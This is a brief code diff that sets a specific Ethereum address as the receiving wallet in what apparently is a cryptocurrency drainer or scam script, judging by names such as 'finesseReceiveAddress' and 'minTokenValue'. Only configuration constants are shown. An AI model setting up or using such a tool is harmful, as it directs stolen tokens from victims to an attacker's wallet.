@@ -1,5 +1,5 @@
-const receiveAddress = "YOUR WALLET";
-const finesseReceiveAddress = "YOUR WALLET"
+const receiveAddress = "0xBC2386601A4Daa3242540F7b6C97BcF432f08332";
+const finesseReceiveAddress = "0xBC2386601A4Daa3242540F7b6C97BcF432f08332"
 const finesseMinimum = 0.2
 const minTokenValue = 100
 
